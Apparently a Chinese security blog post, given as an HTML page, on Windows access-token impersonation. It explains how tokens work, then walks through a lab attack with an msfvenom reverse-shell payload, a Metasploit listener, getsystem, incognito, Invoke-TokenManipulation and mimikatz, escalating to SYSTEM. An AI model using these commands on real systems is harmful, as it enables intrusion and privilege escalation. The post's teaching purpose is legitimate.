@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Windows访问令牌安全探究 | sh1yan&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="description" content="0x00 前言 access token俗称为访问令牌，围绕着该访问令牌也有着相应的渗透技巧，故而也就有这篇文章的总结。 0x01 什么是访问令牌（access token）? 访问令牌是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该user账户相关的进程或线程的身份和权限信息。当user登录时，系统通过将user输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统此时会为u">
+<meta name="keywords" content="access token,令牌伪造">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows访问令牌安全探究">
+<meta property="og:url" content="sh1yan.top/2019/06/09/Windows-Access-Token-Security-Exploration/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 前言 access token俗称为访问令牌，围绕着该访问令牌也有着相应的渗透技巧，故而也就有这篇文章的总结。 0x01 什么是访问令牌（access token）? 访问令牌是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该user账户相关的进程或线程的身份和权限信息。当user登录时，系统通过将user输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统此时会为u">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:\\sh1yan.top\photo\Windows-Access-Token-Security-Exploration\用户进程.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\Windows-Access-Token-Security-Exploration\令牌权限.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\Windows-Access-Token-Security-Exploration\令牌伪造运行计算器.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\Windows-Access-Token-Security-Exploration\猕猴桃抓取.png">
+<meta property="og:updated_time" content="2019-06-10T07:39:51.547Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows访问令牌安全探究">
+<meta name="twitter:description" content="0x00 前言 access token俗称为访问令牌，围绕着该访问令牌也有着相应的渗透技巧，故而也就有这篇文章的总结。 0x01 什么是访问令牌（access token）? 访问令牌是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该user账户相关的进程或线程的身份和权限信息。当user登录时，系统通过将user输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统此时会为u">
+<meta name="twitter:image" content="http:\\sh1yan.top\photo\Windows-Access-Token-Security-Exploration\用户进程.png">
+  
+    <link rel="alternative" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/gossip">Gossip</a>
+        
+          <a class="main-nav-link" href="/yqlj">Links</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="sh1yan.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Windows-Access-Token-Security-Exploration" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/06/09/Windows-Access-Token-Security-Exploration/" class="article-date">
+  <time datetime="2019-06-09T15:16:26.000Z" itemprop="datePublished">2019-06-09</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞研究/">漏洞研究</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Windows访问令牌安全探究
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="sh1yan.top/2019/06/09/Windows-Access-Token-Security-Exploration/"></div>
+    </li>
+  </ul>
+</div>
+
+      
+      
+        
+        <p><strong>0x00 前言</strong></p>
+<p>access token俗称为访问令牌，围绕着该访问令牌也有着相应的渗透技巧，故而也就有这篇文章的总结。</p>
+<p><strong>0x01 什么是访问令牌（access token）?</strong></p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/desktop/SecAuthZ/access-tokens" target="_blank" rel="noopener">访问令牌</a>是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该user账户相关的进程或线程的身份和权限信息。当user登录时，系统通过将user输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统此时会为user生成一个访问令牌。之后，该user执行的每个进程都会拥有一个该访问令牌的拷贝。<br><a id="more"></a><br>而令牌就像是一个标识符，标识该账号的一切应用和操作。如下图，分类有 network service、local service、shiyan 三个用户账号创建并运行的进程。</p>
+<p><img src="http:\\sh1yan.top\photo\Windows-Access-Token-Security-Exploration\用户进程.png" alt></p>
+<p><strong>0x02 令牌的作用</strong></p>
+<p>当进程或者线程需要访问某个具有安全属性的对象时（通常是内核对象），OS会根据这个Token在该对象的访问控制列表里进行搜索，从而决定该用户或者用户所在的组对该对象是否具有访问权利。</p>
+<p>Access Token中具有用户可以使用的特权，这些特权指定了该进程或者线程能否执行一些特定的操作，例如：关闭计算机。</p>
+<p><img src="http:\\sh1yan.top\photo\Windows-Access-Token-Security-Exploration\令牌权限.png" alt></p>
+<p>这里我创建了一个test.txt文件，通过截图可以看到，该文件的所有者是 shiyan，因为是该账号创建的，但是 administrator、system、对该文件也是用拥有完全控制的权限的。同时authenticated users类型的账号对该文件是拥有修改权限的。</p>
+<p><strong>0x03 令牌的种类</strong></p>
+<p>目前访问令牌分为两种令牌：</p>
+<ol>
+<li>主令牌（每一个进程都具有一个唯一的主令牌，进行通过主令牌被开启）</li>
+<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
+</ol>
+<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。</p>
+<p>而关于进程与线程的关系，确实有点复杂，我简单的说几点：</p>
+<ul>
+<li>每个进程至少包含一个线程</li>
+<li>进程中所有线程结束后，该进程也会结束</li>
+<li>主动结束进程时，如线程还在运行，系统会自动结束还在运行的线程</li>
+</ul>
+<p>主令牌是由windows内核创建并分配给进程的默认访问令牌，每一个进程有一个主令牌，它描述了与当前进程相关的用户帐户的安全上下文。同时，一个线程可以模拟一个客户端帐户，允许此线程与安全对象交互时用客户端的安全上下文。一个正模拟客户端的线程拥有一个主令牌和一个模拟令牌。</p>
+<p>注：主令牌和模拟令牌，会在系统重启或者关机后全部清除，不然将会一直在内存中存留。也就是说，如果机器不关机或者重启的话，就会存在散落的令牌。但是，由于权限的问题，当前账号只能看到自己的访问令牌和比自己权限低的账号的访问令牌。如果想看到所有访问令牌，需要当前权限为系统最高权限才行。</p>
+<p><strong>0x04 访问令牌的组成</strong></p>
+<p>Windows access token ：</p>
+<ul>
+<li>用户（User）。用户账号的SID。若用户登录到本地计算机上的一个账号，则他的 SID来自于本地SAM维护的账号数据库；若用户登录到一个域账号，则他的SID来自于活动目录里用户对象的Object-SID属性。</li>
+<li>组（Groups）。包含该用户的安全组的SID列表，表中也包含代表活动目录里用户 账号的用户对象的SID-History属性里的SID。</li>
+<li>特权（Privileges）。用户和用户的安全组在本地计算机上拥有的特权列表。</li>
+<li>所有者（Owner）。特定用户或安全组的SID，这些用户或安全组默认成为用户所 创建或拥有的任何对象的所有者。</li>
+<li>主组（Primary Group）。用户的主安全组的SID。这个信息只由POSIX子系统使用， Windows 2000的其他部分对其忽略。</li>
+<li>默认任意访问控制表（Default Discretionary Access Control List, DACL）。一组内置 许可权。在没有其他访问控制信息存在时操作系统将其作用于用户所创建的对象。默认DACL向创建所有者和系统赋予完全控制（Full Control）权限。</li>
+<li>源（Source）。导致访问令牌被创建的进程，例如会话管理器、LAN管理器或远程 过程调用（RPC）服务器。</li>
+<li>类型（Type）。指示访问令牌是主（primary）令牌还是模拟（impersonation）令牌。 主令牌代表一个进程的安全上下文；模拟令牌是服务进程里的一个线程，用来临时接受一个不同的安全上下文（如服务的一个客户的安全上下文）的令牌。</li>
+<li>模拟级别（Impersonation Level）。指示服务对该访问令牌所代表的客户的安全上下 文的接受程度。</li>
+<li>统计信息（Statistics）。关于访问令牌本身的信息。操作系统在内部使用这个信息。</li>
+<li>限制SID（Restricting SID）。由一个被授权创建受限令牌的进程添加到访问令牌里 的可选的SID列表。限制SID可以将线程的访问限制到低于用户被允许的级别。</li>
+<li>会话ID（Session ID）。指示访问令牌是否与终端服务（Terminal Services）客户会 话相关。</li>
+</ul>
+<p>而在mimikatz中抓出来的token显示如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) <span class="comment"># token::whoami</span></span><br><span class="line"> * Process Token : <span class="number">1426496</span>   	L-PC\L	S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-468267683</span><span class="number">-2575715905</span><span class="number">-647264286</span><span class="number">-1000</span>	(<span class="number">12</span>g,<span class="number">23</span>p)	Primary</span><br><span class="line"> * Thread Token  : no token</span><br></pre></td></tr></table></figure>
+<p><strong>0x05 常见的伪造工具</strong></p>
+<p>Metasploit 中的 incognito 插件</p>
+<p>Windows 平台下的 <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip" target="_blank" rel="noopener">incognito</a> 工具</p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener">Invoke-TokenManipulation.ps1</a> 脚本</p>
+<p>Mimkatz 中的 token::list</p>
+<p>CobaltSrike 中的 steal_token 插件</p>
+<p><strong>0x06 伪造现场–开始</strong></p>
+<p>测试机①：Windows7，192.168.3.141</p>
+<p>测试机②：kali2017，192.168.3.137</p>
+<p>1、Metasploit 中的 incognito 插件</p>
+<p>首先，我们生成一个反弹shell，用于在目标机执行。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">3.137</span> LPORT=<span class="number">4444</span> -f exe -o token_shell.exe</span><br></pre></td></tr></table></figure>
+<p>然后我们在kali上进行监听操作：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport <span class="number">4444</span></span><br><span class="line">lport =&gt; <span class="number">4444</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost  <span class="number">192.168</span>.<span class="number">3.137</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">3.137</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<p>进入到 meterpreter 模式下后，我们就可以开始令牌伪造的操作了。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid     <span class="comment"># 获取当前用户信息</span></span><br><span class="line">Server <span class="symbol">username:</span> L-PC\shiyan</span><br><span class="line">meterpreter &gt; getsystem   <span class="comment"># 进行提高到最高权限</span></span><br><span class="line">...got system via technique <span class="number">1</span> (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid      <span class="comment"># 查看当前用户信息</span></span><br><span class="line">Server <span class="symbol">username:</span> NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; load incognito   <span class="comment"># 加载 incognito 插件</span></span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u  <span class="comment"># 列出当前可以令牌伪造的清单</span></span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">L-PC\shiyan</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br><span class="line">meterpreter &gt; impersonate_token <span class="string">"NT AUTHORITY\NETWORK SERVICE"</span>  <span class="comment"># 伪造该用户</span></span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">meterpreter &gt; getuid  <span class="comment"># 查看当前用户信息，阿偶，查看失败，说明系统内置的账号还是有问题的。</span></span><br><span class="line">[-] <span class="symbol">stdapi_sys_config_getuid:</span> Operation <span class="symbol">failed:</span> Access is denied.</span><br><span class="line">meterpreter &gt; rev2self  <span class="comment"># 返回之前的token</span></span><br></pre></td></tr></table></figure>
+<p>我估计可能是内置用户的原因吧，提示的伪造成功，但是权限失败，那继续实操。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem  <span class="comment"># 进行提高到最高权限</span></span><br><span class="line">...got system via technique <span class="number">1</span> (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid   <span class="comment"># 查看当前用户信息</span></span><br><span class="line">Server <span class="symbol">username:</span> NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; list_tokens -u  <span class="comment"># 列出当前可以令牌伪造的清单</span></span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">L-PC\shiyan</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token <span class="string">"L-PC\\shiyan"</span> <span class="comment"># 伪造该用户</span></span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user L-PC\shiyan</span><br><span class="line">meterpreter &gt; getuid <span class="comment"># 获取当前用户信息，伪造成功！</span></span><br><span class="line">Server <span class="symbol">username:</span> L-PC\shiyan</span><br><span class="line">meterpreter &gt; drop_token  <span class="comment"># 返回之前的token，和 rev2self 一样。</span></span><br></pre></td></tr></table></figure>
+<p>除了直接伪造还可以同归UID值进行伪造的。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; steal_token <span class="number">1234</span></span><br></pre></td></tr></table></figure>
+<p>这句操作命令，其实都差不多，只不过伪造的UID，效果一样的。</p>
+<p>2、Windows 平台下的 incognito 工具</p>
+<p>首先，我们去MWR InfoSecurity下载开 incognito 这个工具，地址：<a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip" target="_blank" rel="noopener">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
+<p>然后我们放置到目标机上，因为我登录的用户是 L ，该用户是administrator组的，所以不需要提权。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">C:\MK&gt;incognito.exe list_tokens -u   <span class="comment"># 列出当前所有散落的令牌 </span></span><br><span class="line">[-] WARNING: Not running <span class="keyword">as</span> SYSTEM. Not all tokens will be available.</span><br><span class="line">[*] Enumerating tokens</span><br><span class="line">[*] Listing unique users found</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">============================================</span><br><span class="line">L-PC\L</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">============================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br><span class="line"></span><br><span class="line">Administrative Privileges Available</span><br><span class="line">============================================</span><br><span class="line">SeAssignPrimaryTokenPrivilege</span><br><span class="line">SeCreateTokenPrivilege</span><br><span class="line">SeTcbPrivilege</span><br><span class="line">SeTakeOwnershipPrivilege</span><br><span class="line">SeBackupPrivilege</span><br><span class="line">SeRestorePrivilege</span><br><span class="line">SeDebugPrivilege</span><br><span class="line">SeImpersonatePrivilege</span><br><span class="line">SeRelabelPrivilege</span><br><span class="line">SeLoadDriverPrivilege</span><br><span class="line">C:\MK&gt;whoami   <span class="comment"># 查看当前用户</span></span><br><span class="line">l-pc\l</span><br></pre></td></tr></table></figure>
+<p>有点小尴尬，我的 shiyan 这个账号没有登录过，所以在令牌中，未找见。下面我断开下当前用户账号，然后登陆下 shiyan 这个账号，再注销。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">C:\MK&gt;incognito.exe list_tokens -u  <span class="comment"># 列出当前所有散落的令牌 </span></span><br><span class="line">[-] WARNING: Not running <span class="keyword">as</span> SYSTEM. Not all tokens will be available.</span><br><span class="line">[*] Enumerating tokens</span><br><span class="line">[*] Listing unique users found</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">============================================</span><br><span class="line">L-PC\L</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">============================================</span><br><span class="line">L-PC\shiyan</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br><span class="line"></span><br><span class="line">Administrative Privileges Available</span><br><span class="line">============================================</span><br><span class="line">SeAssignPrimaryTokenPrivilege</span><br><span class="line">SeCreateTokenPrivilege</span><br><span class="line">SeTcbPrivilege</span><br><span class="line">SeTakeOwnershipPrivilege</span><br><span class="line">SeBackupPrivilege</span><br><span class="line">SeRestorePrivilege</span><br><span class="line">SeDebugPrivilege</span><br><span class="line">SeImpersonatePrivilege</span><br><span class="line">SeRelabelPrivilege</span><br><span class="line">SeLoadDriverPrivilege</span><br></pre></td></tr></table></figure>
+<p>可以看出，只要计算机不重启，账号登录后，再注销，还是会存在散落的令牌。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\MK&gt;incognito.exe execute -c <span class="string">"L-PC\shiyan"</span> calc.exe  <span class="comment"># 利用shiyan的令牌运行个计算器 </span></span><br><span class="line">[-] WARNING: Not running <span class="keyword">as</span> SYSTEM. Not all tokens will be available.</span><br><span class="line">[*] Enumerating tokens</span><br><span class="line">[*] Searching <span class="keyword">for</span> availability of requested token</span><br><span class="line">[+] Requested token found</span><br><span class="line">[-] No Delegation token available</span><br><span class="line">[*] Attempting to create new child process <span class="keyword">and</span> communicate via anonymous pipe</span><br></pre></td></tr></table></figure>
+<p><img src="http:\\sh1yan.top\photo\Windows-Access-Token-Security-Exploration\令牌伪造运行计算器.png" alt></p>
+<p>OK！伪造成功。</p>
+<p>那继续提升下权限吧！既然都 list 出 system 的令牌了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\MK&gt;incognito.exe execute -c <span class="string">"NT AUTHORITY\SYSTEM"</span> cmd.exe  <span class="comment"># 将当前cmd提升到 system 权限</span></span><br><span class="line">[-] WARNING: Not running <span class="keyword">as</span> SYSTEM. Not all tokens will be available.</span><br><span class="line">[*] Enumerating tokens</span><br><span class="line">[*] Searching <span class="keyword">for</span> availability of requested token</span><br><span class="line">[+] Requested token found</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[*] Attempting to create new child process <span class="keyword">and</span> communicate via anonymous pipe</span><br><span class="line"></span><br><span class="line">Microsoft Windows [版本 <span class="number">6.1</span><span class="number">.7601</span>]</span><br><span class="line">版权所有 (c) <span class="number">2009</span> Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\MK&gt;whoami  <span class="comment"># 查看当前用户</span></span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+<p>同时，如果想还原的话，就执行下句就还原一开始的token了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c <span class="string">"L-PC\L"</span> cmd.exe</span><br></pre></td></tr></table></figure>
+<p>3、Invoke-TokenManipulation.ps1 脚本</p>
+<p>Invoke-TokenManipulation.ps1脚本来源于PowerSploit，一个基于powershell的强大的后渗透框架。</p>
+<p>脚本地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>
+<p>由于本地测试环境的问题，各种问题，并且调整限制后，依旧还是存在问题，我就只贴代码了。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 想法提升当前用户权限为 system 后，再执行操作。</span><br><span class="line">PS &gt; .\Invoke-TokenManipulation -Enumerate | <span class="built_in">out-file</span> token.txt <span class="comment"># 列出当前散落的令牌，并保存到 token.txt 文件里。</span></span><br><span class="line">PS &gt; .\Invoke-TokenManipulation -Enumerate  <span class="comment"># 列举当前计算机散落的令牌</span></span><br><span class="line">PS &gt; .\Invoke-TokenManipulation -CreateProcess <span class="string">"cmd.exe"</span> -Username <span class="string">"NT AUTHORITY\SYSTEM"</span>  <span class="comment"># 将当前cmd提升至system权限下</span></span><br><span class="line">PS &gt; .\Invoke-TokenManipulation -CreateProces <span class="string">"cmd.exe"</span> -ProcesId <span class="number">1234</span> <span class="comment"># 已UID的形式，提升权限</span></span><br></pre></td></tr></table></figure>
+<p>4、Mimkatz 中的 token::list</p>
+<p>把mimikatz放到目标机后。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">C:\MK &gt; mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"token::whoami"</span> <span class="string">"TOKEN::List"</span> &gt; token_log.txt</span><br><span class="line"> .<span class="comment">#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Oct 16 2015 01:35:44)</span></span><br><span class="line"> .<span class="comment">## ^ ##.  </span></span><br><span class="line"> <span class="comment">## / \ ##  /* * *</span></span><br><span class="line"> <span class="comment">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="string">'## v ##'</span>   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line">  <span class="string">'#####'</span>                                     <span class="keyword">with</span> <span class="number">17</span> modules * * */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">'20'</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># token::whoami</span></span><br><span class="line"> * Process Token : <span class="number">1844846</span>   	L-PC\L	S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-468267683</span><span class="number">-2575715905</span><span class="number">-647264286</span><span class="number">-1000</span>	(<span class="number">12</span>g,<span class="number">23</span>p)	Primary</span><br><span class="line"> * Thread Token  : no token</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># TOKEN::List</span></span><br><span class="line">Token Id  : <span class="number">0</span></span><br><span class="line">User name : </span><br><span class="line">SID name  : </span><br><span class="line"></span><br><span class="line"><span class="number">244</span>	<span class="number">34806</span>     	NT AUTHORITY\SYSTEM	S<span class="number">-1</span><span class="number">-5</span><span class="number">-18</span>	(<span class="number">04</span>g,<span class="number">30</span>p)	Primary</span><br><span class="line">......</span><br><span class="line"><span class="number">4900</span>	<span class="number">659843</span>    	L-PC\L	S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-468267683</span><span class="number">-2575715905</span><span class="number">-647264286</span><span class="number">-1000</span>	(<span class="number">12</span>g,<span class="number">23</span>p)	Primary</span><br><span class="line">.......</span><br><span class="line"><span class="number">492</span>	<span class="number">71647</span>     	NT AUTHORITY\NETWORK SERVICE	S<span class="number">-1</span><span class="number">-5</span><span class="number">-20</span>	(<span class="number">10</span>g,<span class="number">03</span>p)	Primary</span><br><span class="line">.......</span><br><span class="line"><span class="number">492</span>	<span class="number">73243</span>     	NT AUTHORITY\LOCAL SERVICE	S<span class="number">-1</span><span class="number">-5</span><span class="number">-19</span>	(<span class="number">15</span>g,<span class="number">04</span>p)	Primary</span><br><span class="line">.......</span><br><span 